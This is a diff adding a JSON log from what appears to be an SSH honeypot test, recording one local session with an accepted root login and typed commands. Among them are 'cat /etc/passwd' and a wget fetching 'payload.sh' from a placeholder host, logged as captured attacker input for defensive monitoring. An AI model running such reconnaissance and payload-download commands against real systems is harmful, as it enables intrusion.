@@ -1,0 +1,10 @@
+{"event": "session_start", "ts": "2026-10-22T14:13:47.825104+00:00", "session_id": "0b88a238", "src_ip": "127.0.0.1", "src_port": 59553, "client_banner": "SSH-2.0-OpenSSH_for_Windows_9.5"}
+{"event": "auth_attempt", "ts": "2026-10-22T14:14:06.630379+00:00", "session_id": "0b88a238", "src_ip": "127.0.0.1", "username": "root", "password": "hunter2", "accepted": true}
+{"event": "command", "ts": "2026-10-22T14:14:35.157733+00:00", "session_id": "0b88a238", "src_ip": "127.0.0.1", "command": "whoami", "seconds_since_prev": 28.5067, "backspaces": 0}
+{"event": "command", "ts": "2026-10-22T14:14:39.845762+00:00", "session_id": "0b88a238", "src_ip": "127.0.0.1", "command": "uname -a", "seconds_since_prev": 4.688, "backspaces": 0}
+{"event": "command", "ts": "2026-10-22T14:14:44.405006+00:00", "session_id": "0b88a238", "src_ip": "127.0.0.1", "command": "ls -la", "seconds_since_prev": 4.5592, "backspaces": 0}
+{"event": "command", "ts": "2026-10-22T14:14:48.601171+00:00", "session_id": "0b88a238", "src_ip": "127.0.0.1", "command": "cat /etc/passwd", "seconds_since_prev": 4.1962, "backspaces": 0}
+{"event": "command", "ts": "2026-10-22T14:14:53.988851+00:00", "session_id": "0b88a238", "src_ip": "127.0.0.1", "command": "wget http://example.com/payload.sh", "seconds_since_prev": 5.3877, "backspaces": 0}
+{"event": "command", "ts": "2026-10-22T14:15:28.653103+00:00", "session_id": "0b88a238", "src_ip": "127.0.0.1", "command": "uname -a", "seconds_since_prev": 34.6643, "backspaces": 8}
+{"event": "command", "ts": "2026-10-22T14:15:36.684233+00:00", "session_id": "0b88a238", "src_ip": "127.0.0.1", "command": "exit", "seconds_since_prev": 8.0311, "backspaces": 0}
+{"event": "session_end", "ts": "2026-10-22T14:15:36.698070+00:00", "session_id": "0b88a238", "src_ip": "127.0.0.1", "duration_s": 130.059, "command_count": 7, "auth_attempts": 1, "reason": "closed"}
